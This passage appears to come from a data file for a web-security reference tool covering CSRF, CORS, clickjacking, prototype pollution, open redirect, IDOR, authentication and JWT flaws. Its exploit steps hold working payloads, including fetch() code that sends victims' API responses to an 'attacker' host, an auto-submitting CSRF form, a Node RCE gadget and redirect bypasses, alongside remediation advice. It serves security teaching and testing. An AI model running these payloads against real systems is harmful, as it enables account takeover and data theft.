              { label: "3. Build the forged request as an auto-submitting form", cmd: "<html><body>\n <form action=\"https://target/account/change-email\" method=\"POST\">\n   <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n </form>\n <script>document.forms[0].submit()</script>\n</body></html>" },
              { label: "4. GET-based actions are even simpler", cmd: "# if a GET changes state, an <img> tag alone fires it on page load:\n<img src=\"https://target/account/delete?confirm=true\">" },
              { label: "5. Deliver and chain", cmd: "# host the page and lure the authenticated victim to it\n# chain: CSRF the email to one you control -> trigger password reset -> account takeover" }
            ]
          },
          {
            title: "Common Bypasses to Test",
            type: "table",
            columns: ["Weak defence", "Bypass"],
            rows: [
              ["Token not validated", "Remove it entirely and see if the request still works"],
              ["Token not tied to session", "Use a token from another account"],
              ["Token only on POST", "Try the same action as GET"],
              ["Method check only", "Override with X-HTTP-Method-Override or a different verb"],
              ["Referer check", "Suppress the Referer (meta referrer) or match a lax substring check"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a cookie-authorised state change", "Candidate CSRF target"],
              ["2", "Confirm the token is missing/weak", "Forgeable request"],
              ["3", "Host an auto-submitting page", "Request fires from victim's session"],
              ["4", "Change email/password, then reset", "Account takeover"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite", "Generate CSRF PoCs, test token validation logic"],
              ["Browser + custom HTML", "Host and deliver the forged request"],
              ["XSStrike / manual", "Chain with XSS to defeat token protection"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — CSRF", url: "https://portswigger.net/web-security/csrf" },
              { label: "OWASP — CSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Use anti-CSRF tokens: unpredictable, per-session (or per-request), validated server-side, and bound to the user's session.",
              "Set SameSite=Lax (or Strict) on session cookies — it blocks most cross-site request delivery by default in modern browsers.",
              "For sensitive actions, re-authenticate or require a second factor.",
              "Prefer framework-provided CSRF protection over hand-rolled checks; Referer/Origin checks are a weaker fallback.",
              "Do not rely on custom request headers alone unless you also enforce CORS correctly."
            ]
          }
        ]
      },
      {
        id: "cors-misconfig",
        name: "CORS Misconfiguration",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/cors",
        description: "An over-permissive cross-origin policy lets a malicious site read authenticated responses from the target.",
        brief: "CORS controls which origins may read responses from a cross-origin request. Misconfigured, it hands that permission to attackers — most commonly by reflecting the request's Origin header into Access-Control-Allow-Origin while also allowing credentials, which lets any site make authenticated requests and read the responses.\n\nImpact: theft of session-bound data, tokens, and PII directly from authenticated API responses. Unlike CSRF (which can send but not read), a CORS misconfiguration leaks the response body to an attacker-controlled page.",
        quickReference: [
          { label: "The dangerous combo", cmd: "Access-Control-Allow-Origin: <reflected origin>\nAccess-Control-Allow-Credentials: true" },
          { label: "Test: reflected origin", cmd: "Send  Origin: https://evil.com  — is it echoed back in ACAO?" },
          { label: "Test: null origin", cmd: "Origin: null  — accepted? Reachable from a sandboxed iframe" },
          { label: "Weak regex", cmd: "Origin: https://target.com.evil.com  or  https://eviltarget.com — does a substring match pass?" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Send a rogue Origin and read the response headers", cmd: "curl -s -I 'https://target/api/account' -H 'Origin: https://evil.com' -b 'session=<cookie>'\n# vulnerable if the response reflects it:\n#   Access-Control-Allow-Origin: https://evil.com\n#   Access-Control-Allow-Credentials: true" },
              { label: "2. Probe weak allow-list logic", cmd: "# try each and inspect ACAO:\nOrigin: null                          # accepted? -> sandboxed iframe delivery\nOrigin: https://target.com.evil.com   # suffix trick passes a naive endsWith\nOrigin: https://eviltarget.com        # prefix/substring match\nOrigin: https://sub.target.com        # all-subdomains trust + one subdomain XSS" },
              { label: "3. Build a PoC that reads authenticated data", cmd: "<script>\n fetch('https://target/api/account', {credentials:'include'})\n   .then(r => r.text())\n   .then(d => fetch('https://attacker/collect?d=' + encodeURIComponent(d)));\n</script>\n# victim visits -> their private API response is exfiltrated to you" },
              { label: "4. null-origin variant via a sandboxed iframe", cmd: "<iframe sandbox=\"allow-scripts\" srcdoc=\"<script>\n fetch('https://target/api/account',{credentials:'include'})\n   .then(r=>r.text()).then(d=>location='https://attacker/?d='+btoa(d));\n</script>\"></iframe>   # forces Origin: null" },
              { label: "5. Escalate with the leaked material", cmd: "# read a CSRF token / API key from the response, then perform actions as the victim\n# or use leaked session data for further account compromise" }
            ]
          },
          {
            title: "Misconfiguration Patterns",
            type: "table",
            columns: ["Pattern", "Risk"],
            rows: [
              ["Reflect Origin + credentials", "Any origin can read authenticated responses — the classic critical case"],
              ["ACAO: null + credentials", "Reachable via sandboxed iframes / data: URLs"],
              ["Wildcard with credentials", "Browsers block ACAO:* with credentials, but broken proxies sometimes allow it"],
              ["Weak origin allow-list", "Substring/suffix checks let target.com.evil.com or eviltarget.com through"],
              ["Trusting all subdomains", "One XSS on any subdomain then reads everything cross-origin"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Send Origin: evil.com, inspect ACAO/ACAC", "Confirm reflected origin + credentials"],
              ["2", "Host a fetch() PoC with credentials", "Cross-origin read of private data"],
              ["3", "Lure the authenticated victim", "Response body exfiltrated"],
              ["4", "Reuse leaked token/key", "Actions as the victim"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (CORS* checks)", "Detect reflected-origin and credentials misconfig"],
              ["curl", "Quick header probing with a forged Origin"],
              ["CORScanner / Corsy", "Automated CORS misconfiguration scanning"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — CORS", url: "https://portswigger.net/web-security/cors" },
              { label: "PortSwigger — Exploiting CORS misconfigurations", url: "https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Never reflect the Origin header blindly; validate it against a strict server-side allow-list of exact origins.",
              "Only send Access-Control-Allow-Credentials: true when genuinely required, and never together with a wildcard or reflected origin.",
              "Avoid trusting null and avoid loose regex matching — anchor and fully match the origin.",
              "Keep sensitive data out of endpoints that are CORS-enabled where possible.",
              "Do not treat CORS as an access-control mechanism; it governs read access from browsers, not authorization."
            ]
          }
        ]
      },
      {
        id: "clickjacking",
        name: "Clickjacking",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/clickjacking",
        description: "The target page is framed invisibly so the victim's clicks land on it, triggering unintended actions.",
        brief: "Clickjacking (UI redress) loads the target site in a transparent or disguised iframe over attacker-controlled content, so the victim thinks they are interacting with the attacker's page while their clicks actually hit the framed target. Combined with the victim's active session, this drives state-changing actions.\n\nImpact: unintended actions performed as the victim — enabling a setting, confirming a payment, granting an OAuth scope. The defence is to refuse to be framed by untrusted origins, via frame-ancestors CSP or the legacy X-Frame-Options header.",
        quickReference: [
          { label: "Test: can the page be framed?", cmd: "<iframe src=\"https://target.com/sensitive\"></iframe>  — does it render?" },
          { label: "Missing protections", cmd: "No  X-Frame-Options  and no  Content-Security-Policy: frame-ancestors" },
          { label: "Overlay concept", cmd: "Position a transparent iframe (opacity:0) above a decoy button" },
          { label: "Variant", cmd: "Drag-and-drop / cursor-jacking for multi-step actions" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Check the anti-framing headers", cmd: "curl -s -I 'https://target/account/settings' | grep -iE 'x-frame-options|content-security-policy'\n# no X-Frame-Options AND no frame-ancestors in CSP -> framable" },
              { label: "2. Confirm it renders inside an iframe", cmd: "<iframe src=\"https://target/account/settings\" width=800 height=600></iframe>\n# if the real page loads (rather than being blocked), clickjacking is possible" },
              { label: "3. Overlay a decoy over the sensitive control", cmd: "<style>\n iframe{position:absolute;top:0;left:0;width:800px;height:600px;opacity:0.0;z-index:2}\n .decoy{position:absolute;top:410px;left:300px;z-index:1}\n</style>\n<div class=\"decoy\"><button>Claim your free prize</button></div>\n<iframe src=\"https://target/account/enable-2fa-off\"></iframe>\n# align the invisible real button under the visible decoy" },
              { label: "4. Multi-step variants", cmd: "# drag-and-drop 'cursorjacking' to fill fields, or chain frames\n# to walk a victim through a multi-click flow (e.g. OAuth consent)" },
              { label: "5. Defeat weak JS frame-busting", cmd: "# if the page uses JS to break out of frames, neutralise it:\n<iframe sandbox=\"allow-forms allow-scripts\" src=\"https://target/...\"></iframe>\n# sandbox without allow-top-navigation blocks the frame-buster" }
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Check", "Detail"],
            rows: [
              ["Response headers", "Absence of X-Frame-Options and frame-ancestors in CSP"],
              ["Framing test", "Load the page in an iframe from another origin — if it renders, it is framable"],
              ["Sensitive actions", "Identify one-click state changes worth hijacking"],
              ["Frame-buster quality", "Weak JS frame-busting can be defeated with the sandbox attribute"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Confirm missing frame protections", "Page is framable"],
              ["2", "Overlay a decoy over a real control", "Clicks routed to the target"],
              ["3", "Lure the authenticated victim to click", "State change fires in their session"],
              ["4", "Chain to a larger weakness", "Escalated impact"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (Clickbandit)", "Auto-generate a clickjacking PoC page"],
              ["curl", "Header inspection for missing anti-framing controls"],
              ["Browser + HTML/CSS", "Build and align the overlay proof"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Clickjacking", url: "https://portswigger.net/web-security/clickjacking" },
              { label: "OWASP — Clickjacking Defense Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Set Content-Security-Policy: frame-ancestors 'self' (or an explicit allow-list) — the modern, robust control.",
              "Also set X-Frame-Options: DENY or SAMEORIGIN for older browsers.",
              "Do not rely on JavaScript frame-busting; it is bypassable with the iframe sandbox attribute.",
              "Require an explicit, hard-to-hijack confirmation for the most sensitive actions.",
              "Test the headers on every sensitive page, not just the site root."
            ]
          }
        ]
      },
      {
        id: "prototype-pollution",
        name: "Prototype Pollution",
        severity: "High",
        ref: "https://portswigger.net/web-security/prototype-pollution",
        description: "Injecting into Object.prototype in JavaScript, corrupting application behaviour up to XSS or RCE.",
        brief: "Prototype pollution is a JavaScript-specific flaw where an attacker sets properties on Object.prototype via keys like __proto__ or constructor.prototype. Because nearly every object inherits from that prototype, a polluted property silently appears on objects across the application, changing logic that was never meant to be attacker-influenced.\n\nImpact: DOM XSS on the client, and on Node.js servers config corruption, security-flag bypass, denial of service, and — with the right gadget — command execution. It hides in recursive merges, object-path setters, and query-string parsers.",
        quickReference: [
          { label: "Client-side probe", cmd: "?__proto__[test]=polluted   then check  Object.prototype.test  in console" },
          { label: "JSON payload", cmd: "{\"__proto__\": {\"isAdmin\": true}}" },
          { label: "Constructor path", cmd: "constructor[prototype][test]=polluted" },
          { label: "Gadget hunt", cmd: "Find a property the app reads but never sets — pollute it to change behaviour" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Pollute a test property and confirm inheritance", cmd: "# client-side, via the query string:\n?__proto__[claudetest]=polluted\n# then in the browser console:\nObject.prototype.claudetest   // 'polluted' -> vulnerable\n# server-side, via a JSON body to a merge endpoint:\n{\"__proto__\":{\"claudetest\":\"polluted\"}}" },
              { label: "2. Try each pollution vector", cmd: "?__proto__[x]=y                 # bracket in query string\nconstructor[prototype][x]=y      # constructor path (when __proto__ is filtered)\n{\"__proto__\":{\"x\":\"y\"}}          # JSON key\n# any recursive merge / object-path set of user data is a candidate" },
              { label: "3. Find a gadget — a property the code reads but never sets", cmd: "# search client scripts / server code for undefined-property reads:\n#   options.transport_url, config.shell, sanitizer.ALLOWED_ATTR, isAdmin\n# whichever the app trusts becomes the exploit primitive" },
              { label: "4. Client gadget -> DOM XSS", cmd: "# many sanitisers/templates read config from an object you can pollute:\n?__proto__[hitCallback]=alert(document.domain)     # analytics gadget\n?__proto__[srcdoc][0]=<img/src/onerror=alert(1)>   # template gadget -> XSS" },
              { label: "5. Server gadget -> RCE (Node)", cmd: "# pollute options later passed to child_process:\n{\"__proto__\":{\"shell\":\"/proc/self/exe\",\"argv0\":\"node\",\"NODE_OPTIONS\":\"--require /proc/self/environ\"}}\n# or env/argv gadgets documented per-library -> command execution" }
            ]
          },
          {
            title: "Vulnerable Sinks",
            type: "table",
            columns: ["Pattern", "Risk"],
            rows: [
              ["Recursive merge/extend", "merge(target, userInput) that copies __proto__ into the prototype"],
              ["Object path setters", "lodash.set / setValue with an attacker-controlled path"],
              ["Query/JSON parsers", "Parsers that build nested objects from __proto__ keys"],
              ["Deep clone", "Naive clones that carry the polluted property forward"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Pollute a test property", "Confirm prototype pollution"],
              ["2", "Find a gadget the app reads", "A concrete exploit path"],
              ["3", "Pollute the gadget property", "DOM XSS / flag bypass / RCE"],
              ["4", "Escalate via the gadget's effect", "Client or server compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (DOM Invader)", "Automated client-side prototype-pollution + gadget discovery"],
              ["ppmap / silentspring", "Scan for pollution sources and known gadgets"],
              ["Node.js REPL", "Validate server-side gadgets locally"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Prototype pollution", url: "https://portswigger.net/web-security/prototype-pollution" },
              { label: "PayloadsAllTheThings — Prototype Pollution", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Reject or strip __proto__, constructor, and prototype keys in user-supplied objects before merging.",
              "Use Object.create(null) for map-like objects, or a Map, so there is no prototype to pollute.",
              "Use Object.freeze(Object.prototype) as a hardening measure where feasible.",
              "Prefer libraries patched against prototype pollution and keep them updated (many merge/set utilities have advisories).",
              "Validate input structure with a strict schema rather than deep-merging arbitrary objects."
            ]
          }
        ]
      },
      {
        id: "open-redirect",
        name: "Open Redirect",
        severity: "Low",
        ref: "https://cwe.mitre.org/data/definitions/601.html",
        description: "A redirect target taken from user input sends victims to attacker sites, aiding phishing and token theft.",
        brief: "An open redirect exists when an application redirects to a URL taken from user-controllable input without validating it. On its own it is low severity — but it lends a trusted domain to phishing links, and becomes serious when chained: leaking OAuth tokens or authorization codes via a loose redirect_uri, or bouncing through to SSRF or XSS.\n\nImpact: credible phishing under a trusted domain, and OAuth token/code theft when chained. The fix is to never redirect to a raw user-supplied absolute URL; use an allow-list or relative paths only.",
        quickReference: [
          { label: "Basic test", cmd: "?next=https://evil.com   ?url=//evil.com   ?redirect=https:evil.com" },
          { label: "Filter bypasses", cmd: "//evil.com   https:/\\evil.com   https://target.com@evil.com   /\\/evil.com" },
          { label: "OAuth token theft angle", cmd: "redirect_uri=https://evil.com  — leaks code/token if not strictly matched" },
          { label: "Where to look", cmd: "Login/logout next=, return_to, callback, url, dest parameters" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Find redirect parameters and test the raw case", cmd: "# common names: next, url, return, returnTo, redirect, dest, callback, continue\nhttps://target/login?next=https://evil.com\n# follow the response: a 3xx Location: https://evil.com = open redirect" },
              { label: "2. Defeat naive filters", cmd: "//evil.com                      # protocol-relative (no scheme to block)\nhttps:/\\evil.com                # backslash confuses parsers\nhttps://target.com@evil.com      # everything before @ is userinfo -> lands on evil.com\nhttps://target.com.evil.com      # suffix trick vs endsWith('target.com')\n/%2f/evil.com   /\\/evil.com      # encoded / mixed slashes normalise oddly" },
              { label: "3. Weaponise for phishing", cmd: "# a link on the trusted domain that silently lands on your page:\nhttps://target.com/login?next=https://evil-login.com\n# victims trust the visible target.com host" },
              { label: "4. Chain to OAuth token/code theft", cmd: "# if redirect_uri isn't exact-matched, point it at your host:\nhttps://target/oauth/authorize?client_id=..&redirect_uri=https://evil.com&response_type=token\n# the access token / auth code is delivered to evil.com" },
              { label: "5. Chain to XSS / SSRF where the scheme is honoured", cmd: "?next=javascript:alert(document.domain)   # if used in a sink -> XSS\n?url=http://169.254.169.254/latest/meta-data/   # server-side follow -> SSRF" }
            ]
          },
          {
            title: "Common Bypasses",
            type: "table",
            columns: ["Filter", "Bypass"],
            rows: [
              ["Blocks http/https", "Protocol-relative //evil.com"],
              ["Requires leading /", "/\\evil.com or /%2f/evil.com — browsers normalise oddly"],
              ["Allow-list by substring", "https://target.com.evil.com or https://evil.com/target.com"],
              ["Uses @ parsing", "https://target.com@evil.com (everything before @ is userinfo)"],
              ["Backslash quirks", "https:/\\/\\evil.com and mixed slashes"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a user-controlled redirect param", "Candidate open redirect"],
              ["2", "Bypass any weak validation", "Redirect to attacker host confirmed"],
              ["3", "Phish under the trusted domain", "Credential capture"],
              ["4", "Or abuse a loose redirect_uri", "OAuth token / code theft"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite", "Test redirect params and filter bypasses"],
              ["OpenRedireX", "Automated open-redirect fuzzing with payload lists"],
              ["gau / waybackurls", "Harvest URLs with redirect parameters to test"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "CWE-601 — Open Redirect", url: "https://cwe.mitre.org/data/definitions/601.html" },
              { label: "OWASP — Unvalidated Redirects and Forwards Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Do not redirect to user-supplied absolute URLs. Prefer relative paths, or map an input key to a server-side allow-list of destinations.",
              "If external redirects are required, validate against a strict allow-list of exact hosts and reject everything else.",
              "For OAuth, require exact redirect_uri matching — no wildcards, no prefix matching.",
              "Show an interstitial 'you are leaving this site' page for any off-site redirect.",
              "Normalise and parse the URL with a robust library before validating; do not use naive string checks."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Access Control & Authentication",
    vulns: [
      {
        id: "idor",
        name: "IDOR / Broken Access Control",
        severity: "High",
        ref: "https://portswigger.net/web-security/access-control",
        description: "The app trusts a client-supplied identifier without checking ownership, exposing other users' data or actions.",
        brief: "Broken access control is the most common serious web weakness, and IDOR (Insecure Direct Object Reference) is its signature form: an endpoint accepts an object identifier — a user ID, order number, document GUID — and returns or modifies that object without verifying the requester is authorised for it. Change the ID, get someone else's data.\n\nIt covers horizontal access (reaching a peer's resources), vertical access (reaching admin functionality), and missing function-level checks. The root cause is authorising on what the client sends rather than on the authenticated identity.",
        quickReference: [
          { label: "Horizontal IDOR", cmd: "GET /api/account/1001  ->  change to 1002" },
          { label: "Method / function abuse", cmd: "POST /api/user/1002/role  as a normal user" },
          { label: "Guess/enumerate identifiers", cmd: "Sequential IDs, predictable GUIDs, base64'd IDs in cookies/params" },
          { label: "Force-browse admin paths", cmd: "/admin, /api/internal, hidden endpoints from JS/archives" }
        ],
        sections: [
          {
            title: "Forms of Broken Access Control",
            type: "table",
            columns: ["Form", "Description"],
            rows: [
              ["Horizontal IDOR", "Access another user's resource at the same privilege level"],
              ["Vertical escalation", "A low-priv user reaches admin functionality"],
              ["Missing function-level check", "The UI hides an action but the endpoint does not enforce the role"],
              ["Mass/parameter-based", "Passing role=admin or userId= that the server trusts"],
              ["Multi-step bypass", "Skipping a step that carries the real authorization check"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Technique", "Detail"],
            rows: [
              ["Two accounts", "Do an action as user A, replay it as user B (or with B's session) — Burp Autorize automates this"],
              ["Change the identifier", "Increment/replace IDs, GUIDs, and encoded references"],
              ["Change the method", "Try PUT/DELETE where only GET is exposed"],
              ["Remove/alter role hints", "Strip a role parameter or set it to a higher value"],
              ["Force browsing", "Request admin/internal endpoints discovered in JS or archives directly"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Mass data exposure", "Enumerate every user's records via a sequential ID"],
              ["Account takeover", "Change another user's email/password"],
              ["Privilege escalation", "Reach admin functions as a normal user"],
              ["Unauthorised actions", "Modify or delete resources you do not own"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enforce authorization server-side on every request, based on the authenticated session — never trust an ID or role sent by the client.",
              "Check ownership: does this user own or have rights to this specific object? Do it in the data layer, consistently.",
              "Deny by default; require an explicit grant for each function and object, and centralise the checks.",
              "Do not rely on unpredictable IDs (GUIDs) as an access control — obscurity is not authorization, though it slows enumeration.",
              "Test access control with least-privilege accounts as part of every release; it is logic, so scanners miss most of it."
            ]
          }
        ]
      },
      {
        id: "auth-bypass",
        name: "Authentication Bypass",
        severity: "Critical",
        ref: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
        description: "Flaws in login, session, or recovery logic that let an attacker authenticate without valid credentials.",
        brief: "Authentication is meant to prove who you are; a bypass defeats that proof. The weaknesses are diverse — logic flaws in the login flow, broken multi-factor steps, predictable or improperly invalidated session tokens, and flawed password-reset mechanisms — but they share an outcome: access to an account without the legitimate credential.\n\nThis entry covers the flow-level failures; injection-based bypasses (SQL/NoSQL/LDAP) and token forgery (JWT) have their own entries.",
        quickReference: [
          { label: "MFA step skippable", cmd: "Complete step 1, then request the post-MFA endpoint directly" },
          { label: "Response tampering", cmd: "Change {\"success\":false} / 2FA result at the client where the server trusts it" },
          { label: "Password reset flaws", cmd: "Predictable token, token not bound to user, host-header poisoning of reset link" },
          { label: "Session issues", cmd: "Session not rotated on login, weak/guessable IDs, no expiry, fixation" }
        ],
        sections: [
          {
            title: "Common Bypass Classes",
            type: "table",
            columns: ["Class", "Example"],
            rows: [
              ["Broken MFA", "The second factor is not enforced server-side, or its verified state can be forged/skipped"],
              ["Logic flaws", "Register/login race conditions, unverified email accepted, 'remember me' that never checks"],
              ["Session management", "No rotation on privilege change, predictable tokens, missing invalidation on logout"],
              ["Password reset", "Guessable reset tokens, tokens reusable or not user-bound, reset link host from Host header"],
              ["Default/weak accounts", "Leftover test/admin accounts and default credentials"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Test", "Detail"],
            rows: [
              ["Map the full flow", "Every step and every endpoint; try reaching later steps directly"],
              ["Tamper client signals", "Flip success flags, MFA-passed booleans, role values the server may trust"],
              ["Attack password reset", "Inspect token entropy, binding, reuse, and the link-generation source"],
              ["Analyse tokens", "Session/reset token randomness, expiry, rotation, and invalidation behaviour"],
              ["Try known/default creds", "admin/admin and product defaults on admin panels"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Account takeover", "Full access to a victim's account and data"],
              ["MFA defeat", "Access despite a second factor being 'required'"],
              ["Mass compromise", "A systemic reset/session flaw affects all users"],
              ["Privileged access", "Bypass into an admin account"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enforce every authentication step server-side; never trust a client-provided flag that a factor was satisfied.",
              "Rotate the session identifier on login and on any privilege change; invalidate sessions fully on logout and reset.",
              "Generate reset/verification tokens with high entropy, bind them to the user, expire them quickly, and allow one use.",
              "Do not build reset links from the Host header; use a fixed, configured base URL.",
              "Remove default and test accounts, enforce MFA on sensitive accounts, and rate-limit authentication endpoints."
            ]
          }
        ]
      },
      {
        id: "jwt-vulns",
        name: "JWT Vulnerabilities",
        severity: "High",
        ref: "https://portswigger.net/web-security/jwt",
        description: "Implementation flaws in JSON Web Tokens — alg confusion, none, weak secrets — enabling token forgery.",
        brief: "JWTs carry identity and claims in a signed token the server verifies without server-side session state. That design shifts trust onto the signature, and a set of well-known implementation mistakes break it: accepting the 'none' algorithm, confusing RS256 with HS256 so the public key becomes the HMAC secret, weak signing secrets that crack offline, and unvalidated claims.\n\nWhen verification is broken, an attacker forges a token with any identity or role they like — instant privilege escalation or account takeover.",
        quickReference: [
          { label: "alg: none", cmd: "Set header alg to \"none\", strip the signature — some libs accept it" },
          { label: "Key confusion RS256->HS256", cmd: "Sign HS256 using the RSA public key as the HMAC secret" },
          { label: "Crack the HMAC secret", cmd: "jwt_tool <token> -C -d wordlist.txt   (hashcat -m 16500)" },
          { label: "Tamper claims", cmd: "Change \"role\":\"user\" -> \"admin\" (only works if the sig check is broken)" }
        ],
        sections: [
          {
            title: "Attack Classes",
            type: "table",
            columns: ["Attack", "Condition"],
            rows: [
              ["alg: none", "Library honours an unsigned token when alg is none/None/NONE"],
              ["Key confusion", "Server verifies RS256 tokens with an HS256 code path using the public key"],
              ["Weak HMAC secret", "Short/guessable secret cracks offline, then forge anything"],
              ["kid / jku / x5u abuse", "Header injects a key path (traversal/SQLi) or points key retrieval at attacker infra"],
              ["Missing claim checks", "exp/aud/iss not validated — replay or cross-service token use"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Decode and read alg", "The header's alg determines which attacks even apply"],
              ["Run the playbook", "jwt_tool -M at against a live endpoint tries none, confusion, and more"],
              ["Test secret strength", "Attempt an offline crack of the HMAC secret"],
              ["Probe key headers", "Manipulate kid/jku/x5u to control the verification key"],
              ["Check claim validation", "Alter exp/aud/iss and see if the token is still accepted"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Privilege escalation", "Forge a token with an admin role"],
              ["Account takeover", "Forge a token for any user (sub/username)"],
              ["Auth bypass", "Unsigned/forged token accepted as valid"],
              ["Cross-service abuse", "Reuse a token where aud/iss are not enforced"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Pin the expected algorithm server-side and reject any token whose alg does not match; never allow 'none'.",
              "Do not use a verification routine that selects the algorithm from the token header — that is the root of key confusion.",
              "Use a long, high-entropy signing secret for HMAC, or asymmetric keys managed properly; rotate on suspicion.",
              "Validate exp, aud, and iss on every request; keep token lifetimes short and support revocation for sensitive actions.",
              "Do not trust key-location headers (jku/x5u) unless the URL is strictly allow-listed."
            ]
          }
        ]
      },
      {
        id: "mass-assignment",
        name: "Mass Assignment",
        severity: "High",
        ref: "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
        description: "The app binds request fields straight to objects, letting attackers set properties they shouldn't control.",
        brief: "Mass assignment (auto-binding, over-posting) happens when a framework maps incoming request parameters directly onto an internal object or model. If the binding is not restricted, an attacker adds fields the developer never intended to expose — isAdmin, role, balance, verified — and the framework dutifully sets them.\n\nIt is common in modern API frameworks that make object binding effortless, and it turns an ordinary update endpoint into a privilege-escalation primitive.",
        quickReference: [
          { label: "Add a privileged field", cmd: "{\"username\":\"x\",\"email\":\"y\",\"isAdmin\":true}" },
          { label: "Escalate role on update", cmd: "PATCH /api/users/me  {\"role\":\"admin\"}" },
          { label: "Tamper server-owned fields", cmd: "\"balance\":100000   \"verified\":true   \"id\":<other user>" },
          { label: "Discover fields", cmd: "Read a GET response / JS to learn object properties, then set them on write" }
        ],
        sections: [
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Enumerate object fields", "A GET on the resource reveals the property names to try setting"],
              ["Add unexpected fields", "Append role/isAdmin/verified/owner to a create or update request"],
              ["Watch for silent binding", "The field is accepted and persisted even though the UI never offered it"],
              ["Try nested/related objects", "Bind through relationships (e.g. user.roles) where supported"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Privilege escalation", "Set isAdmin/role and become an administrator"],
              ["Business-data tampering", "Change price, balance, ownership, or status fields"],
              ["Account takeover", "Reassign an object's owner/user to yourself"],
              ["Verification bypass", "Flip verified/approved flags"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Bind to an explicit allow-list of fields (a DTO / view model), never directly to the database entity.",
              "Use the framework's field-whitelisting (strong params, @JsonIgnore, ignore/exclude lists) and default to deny.",
              "Set sensitive fields (role, owner, price) only in server-side code paths, never from request binding.",
              "Separate read models from write models so response shape does not dictate what is writable.",
              "Add tests that attempt to over-post privileged fields and assert they are ignored."
            ]
          }
        ]
      },
      {
        id: "business-logic",
        name: "Business Logic Flaws",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/logic-flaws",
        description: "The application enforces its rules incorrectly, letting valid requests achieve invalid outcomes.",
        brief: "Business logic flaws are failures in how an application's rules and workflows are enforced, rather than a classic injection or encoding bug. Every request may be individually well-formed, yet the sequence or combination produces an outcome the business never intended — a negative quantity that credits money, a coupon applied infinitely, a step skipped, a limit not enforced server-side.\n\nThey are invisible to scanners because nothing is malformed; finding them requires understanding what the application is supposed to guarantee and then breaking that assumption.",
        quickReference: [
          { label: "Value manipulation", cmd: "quantity=-1   price=0   currency swap   over-long/negative inputs" },
          { label: "Step skipping", cmd: "Jump straight to the confirmation/fulfilment endpoint" },
          { label: "Limit abuse", cmd: "Reuse a one-time coupon / referral; exceed a per-account cap" },
          { label: "State confusion", cmd: "Cancel-after-fulfil, refund + keep, concurrent requests (see Race Conditions)" }
        ],
        sections: [
          {
            title: "Common Patterns",
            type: "table",
